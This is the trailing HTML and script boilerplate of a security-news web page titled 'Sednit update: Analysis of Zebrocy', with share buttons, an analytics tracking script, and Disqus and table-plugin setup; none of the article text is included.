			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
				<div class="icons" style="text-align: center;">
											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2018%2F04%2F24%2Fsednit-update-analysis-zebrocy%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2018%2F04%2F24%2Fsednit-update-analysis-zebrocy%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2018%2F04%2F24%2Fsednit-update-analysis-zebrocy%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/js/main-0ba0c3843d.js"></script>
    <!-- Version: v1.1.76.32619db9.pro-azeu -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"110286 https:\/\/ba-infohub-web01-v.hq.eset.com\/?p=110286","disqusShortname":"welivesecurity","disqusTitle":"Sednit update: Analysis of Zebrocy","disqusUrl":"https:\/\/www.welivesecurity.com\/2018\/04\/24\/sednit-update-analysis-zebrocy\/","postId":"110286"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/tablepress/js/jquery.datatables.min.js?ver=1.9.1'></script>
<script type="text/javascript">
jQuery(document).ready(function($){
$('#tablepress-545').dataTable({"order":[],"orderClasses":false,"stripeClasses":["even","odd"],"pagingType":"simple"});
});
</script>    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>